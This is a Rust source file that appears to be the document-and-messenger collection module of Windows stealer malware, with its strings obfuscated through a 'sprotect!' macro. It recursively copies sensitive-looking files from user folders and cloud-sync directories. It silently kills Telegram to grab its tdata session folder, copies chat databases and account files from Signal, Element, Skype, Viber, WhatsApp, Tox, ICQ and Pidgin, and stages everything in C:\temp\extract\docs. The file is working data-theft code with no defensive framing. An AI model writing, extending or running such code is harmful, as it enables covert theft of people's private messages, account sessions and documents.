use crate::sprotect;
use std::fs;
use std::path::PathBuf;
use std::process::Command;
use crate::docs::file_types::{should_extract_file, has_sensitive_name};

async fn get_user_directories() -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        dirs.extend(vec![
            base_path.join(sprotect!("Documents")),
            base_path.join(sprotect!("Desktop")),
            base_path.join(sprotect!("Downloads")),
            base_path.join(sprotect!("Pictures")),
            base_path.join(sprotect!("OneDrive")),
            base_path.join(sprotect!("Dropbox")),
            base_path.join(sprotect!("Google Drive")),
            base_path.join(sprotect!("iCloud Drive")),
            base_path.join(sprotect!("Sync")),
            base_path.join(sprotect!("Backup")),
        ]);
    }
    
    dirs
}

fn copy_file_if_exists(src: &PathBuf, dest_dir: &PathBuf, category: &str) -> bool {
    if src.exists() && src.is_file() {
        if let Ok(metadata) = fs::metadata(src) {
            let file_size = metadata.len();
            if let Some(filename) = src.file_name() {
                let src_str = src.to_string_lossy().to_string();
                if should_extract_file(&src_str, file_size) || has_sensitive_name(&src_str) {
                    let category_dir = dest_dir.join(category);
                    if fs::create_dir_all(&category_dir).is_ok() {
                        let dest_path = category_dir.join(filename);
                        return fs::copy(src, dest_path).is_ok();
                    }
                }
            }
        }
    }
    false
}

fn scan_directory_recursive(dir: &PathBuf, dest_dir: &PathBuf, category: &str, max_depth: u32, current_depth: u32) -> u32 {
    if current_depth >= max_depth || !dir.exists() {
        return 0;
    }
    
    let mut files_copied = 0;
    
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                if copy_file_if_exists(&path, dest_dir, category) {
                    files_copied += 1;
                }
                
                if files_copied >= 1000 {
                    break;
                }
            } else if path.is_dir() {
                let dirname = path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("")
                    .to_lowercase();
                
                let skip_dirs = vec![
                    sprotect!("temp"), sprotect!("cache"), sprotect!("logs"), 
                    sprotect!("backup"), sprotect!("recycle"), sprotect!("trash"),
                    sprotect!("$recycle.bin"), sprotect!("system volume information"),
                ];
                
                if !skip_dirs.iter().any(|skip| dirname.contains(skip.as_str())) {
                    files_copied += scan_directory_recursive(&path, dest_dir, category, max_depth, current_depth + 1);
                }
            }
        }
    }
    
    files_copied
}

async fn extract_desktop_documents(dest_dir: &PathBuf) -> u32 {
    let user_dirs = get_user_directories().await;
    let mut total_files = 0;
    
    for dir in user_dirs {
        if dir.exists() {
            let category_str = sprotect!("Unknown");
            let category = dir.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or(&category_str);
            
            let max_depth = match category.to_lowercase().as_str() {
                name if name.contains(sprotect!("desktop").as_str()) => 2,
                name if name.contains(sprotect!("documents").as_str()) => 3,
                name if name.contains(sprotect!("downloads").as_str()) => 2,
                _ => 2,
            };
            
            total_files += scan_directory_recursive(&dir, dest_dir, category, max_depth, 0);
        }
    }
    
    total_files
}

async fn extract_recent_files(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let recent_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Roaming\\Microsoft\\Windows\\Recent")),
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Roaming\\Microsoft\\Office\\Recent")),
        ];
        
        for recent_path in recent_paths {
            if recent_path.exists() {
                files_copied += scan_directory_recursive(&recent_path, dest_dir, &sprotect!("Recent"), 1, 0);
            }
        }
    }
    
    files_copied
}

async fn extract_browser_downloads(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let browser_download_paths = vec![
            base_path.join(sprotect!("AppData\\Local\\Google\\Chrome\\User Data\\Default\\Downloads")),
            base_path.join(sprotect!("AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Downloads")),
            base_path.join(sprotect!("AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Downloads")),
        ];
        
        for download_path in browser_download_paths {
            if download_path.exists() {
                files_copied += scan_directory_recursive(&download_path, dest_dir, &sprotect!("BrowserDownloads"), 1, 0);
            }
        }
    }
    
    files_copied
}

async fn extract_notepad_files(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let notepad_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Roaming\\Notepad++")),
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe")),
        ];
        
        for notepad_path in notepad_paths {
            if notepad_path.exists() {
                files_copied += scan_directory_recursive(&notepad_path, dest_dir, &sprotect!("Notepad"), 2, 0);
            }
        }
    }
    
    files_copied
}

fn copy_dir_recursive(src: &PathBuf, dest: &PathBuf) -> bool {
    if !src.exists() {
        return false;
    }
    
    if fs::create_dir_all(dest).is_err() {
        return false;
    }
    
    if let Ok(entries) = fs::read_dir(src) {
        for entry in entries.flatten() {
            let path = entry.path();
            let dest_path = dest.join(entry.file_name());
            
            if path.is_file() {
                fs::copy(&path, &dest_path).ok();
            } else if path.is_dir() {
                copy_dir_recursive(&path, &dest_path);
            }
        }
    }
    
    true
}

async fn extract_social_media_apps(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let skype_path = base_path.join(sprotect!("AppData\\Roaming\\microsoft\\skype for desktop"));
        if skype_path.exists() {
            let skype_dest = dest_dir.join(sprotect!("Skype"));
            if copy_dir_recursive(&skype_path, &skype_dest) {
                files_copied += 10;
            }
        }
        
        let telegram_path = base_path.join(sprotect!("AppData\\Roaming\\Telegram Desktop\\tdata"));
        if telegram_path.exists() {
            use std::os::windows::process::CommandExt;
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            
            Command::new(sprotect!("taskkill"))
                .args([&sprotect!("/F"), &sprotect!("/IM"), &sprotect!("telegram.exe")])
                .creation_flags(CREATE_NO_WINDOW)
                .output().ok();
            
            let telegram_dest = dest_dir.join(sprotect!("Telegram"));
            if copy_dir_recursive(&telegram_path, &telegram_dest) {
                files_copied += 20;
            }
        }
        
        let signal_path = base_path.join(sprotect!("AppData\\Roaming\\Signal"));
        if signal_path.exists() {
            let signal_dest = dest_dir.join(sprotect!("Signal"));
            fs::create_dir_all(&signal_dest).ok();
            
            let sql_path = signal_path.join(sprotect!("sql"));
            if sql_path.exists() {
                copy_dir_recursive(&sql_path, &signal_dest);
                files_copied += 5;
            }
            
            let attachments_path = signal_path.join(sprotect!("attachments.noindex"));
            if attachments_path.exists() {
                copy_dir_recursive(&attachments_path, &signal_dest);
                files_copied += 5;
            }
            
            let config_path = signal_path.join(sprotect!("config.json"));
            if config_path.exists() {
                let config_dest = signal_dest.join(sprotect!("config.json"));
                fs::copy(&config_path, &config_dest).ok();
                files_copied += 1;
            }
        }
        
        let element_path = base_path.join(sprotect!("AppData\\Roaming\\Element"));
        if element_path.exists() {
            let element_dest = dest_dir.join(sprotect!("Element"));
            fs::create_dir_all(&element_dest).ok();
            
            let indexeddb_path = element_path.join(sprotect!("IndexedDB"));
            if indexeddb_path.exists() {
                copy_dir_recursive(&indexeddb_path, &element_dest);
                files_copied += 10;
            }
            
            let localstorage_path = element_path.join(sprotect!("Local Storage"));
            if localstorage_path.exists() {
                copy_dir_recursive(&localstorage_path, &element_dest);
                files_copied += 5;
            }
        }
        
        let icq_path = base_path.join(sprotect!("AppData\\Roaming\\ICQ"));
        if icq_path.exists() {
            let icq_dest = dest_dir.join(sprotect!("ICQ"));
            if copy_dir_recursive(&icq_path, &icq_dest) {
                files_copied += 8;
            }
        }
        
        let pidgin_path = base_path.join(sprotect!("AppData\\Roaming\\.purple"));
        if pidgin_path.exists() {
            let pidgin_dest = dest_dir.join(sprotect!("Pidgin"));
            fs::create_dir_all(&pidgin_dest).ok();
            
            let accounts_path = pidgin_path.join(sprotect!("accounts.xml"));
            if accounts_path.exists() {
                let accounts_dest = pidgin_dest.join(sprotect!("accounts.xml"));
                fs::copy(&accounts_path, &accounts_dest).ok();
                files_copied += 1;
            }
        }
        
        let viber_path = base_path.join(sprotect!("AppData\\Roaming\\ViberPC"));
        if viber_path.exists() {
            let viber_dest = dest_dir.join(sprotect!("Viber"));
            fs::create_dir_all(&viber_dest).ok();
            
            if let Ok(entries) = fs::read_dir(&viber_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        if let Some(extension) = path.extension() {
                            if extension.to_string_lossy().starts_with(&sprotect!("db")) {
                                let dest_file = viber_dest.join(entry.file_name());
                                fs::copy(&path, &dest_file).ok();
                                files_copied += 1;
                            }
                        }
                    } else if path.is_dir() {
                        let dir_dest = viber_dest.join(entry.file_name());
                        copy_dir_recursive(&path, &dir_dest);
                        files_copied += 3;
                    }
                }
            }
        }
    }
    
    if let Ok(appdata) = std::env::var(sprotect!("APPDATA")) {
        let tox_path = PathBuf::from(&appdata).join(sprotect!("Tox"));
        if tox_path.exists() {
            let tox_dest = dest_dir.join(sprotect!("Tox"));
            if copy_dir_recursive(&tox_path, &tox_dest) {
                files_copied += 5;
            }
        }
    }
    
    if let Ok(localappdata) = std::env::var(sprotect!("LOCALAPPDATA")) {
        let packages_path = PathBuf::from(&localappdata).join(sprotect!("Packages"));
        if packages_path.exists() {
            if let Ok(entries) = fs::read_dir(&packages_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    let dirname = path.file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("")
                        .to_lowercase();
                    
                    if dirname.contains(&sprotect!("whatsappdesktop").to_lowercase()) {
                        let whatsapp_dest = dest_dir.join(sprotect!("Whatsapp"));
                        fs::create_dir_all(&whatsapp_dest).ok();
                        
                        let localstate_path = path.join(sprotect!("LocalState"));
                        if localstate_path.exists() {
                            if let Ok(ls_entries) = fs::read_dir(&localstate_path) {
                                for ls_entry in ls_entries.flatten() {
                                    let ls_path = ls_entry.path();
                                    if ls_path.is_file() {
                                        let filename = ls_path.file_name()
                                            .and_then(|n| n.to_str())
                                            .unwrap_or("");
                                        
                                        if filename.ends_with(&sprotect!(".db")) {
                                            let dest_file = whatsapp_dest.join(ls_entry.file_name());
                                            fs::copy(&ls_path, &dest_file).ok();
                                            files_copied += 1;
                                        }
                                    } else if ls_path.is_dir() {
                                        let dir_name = ls_path.file_name()
                                            .and_then(|n| n.to_str())
                                            .unwrap_or("");
                                        
                                        if dir_name == &sprotect!("profilePictures") {
                                            let pp_dest = whatsapp_dest.join(sprotect!("profilePictures"));
                                            copy_dir_recursive(&ls_path, &pp_dest);
                                            files_copied += 5;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    files_copied
}

pub async fn extract_user_documents() -> Result<(), Box<dyn std::error::Error>> {
    let base_output = PathBuf::from(sprotect!("C:\\temp\\extract\\docs"));
    fs::create_dir_all(&base_output).ok();
    
    let mut total_extracted = 0;
    
    total_extracted += extract_desktop_documents(&base_output).await;
    total_extracted += extract_recent_files(&base_output).await;
    total_extracted += extract_browser_downloads(&base_output).await;
    total_extracted += extract_notepad_files(&base_output).await;
    total_extracted += extract_social_media_apps(&base_output).await;
    
    if total_extracted == 0 {
        fs::remove_dir_all(&base_output).ok();
    }
    
    Ok(())
}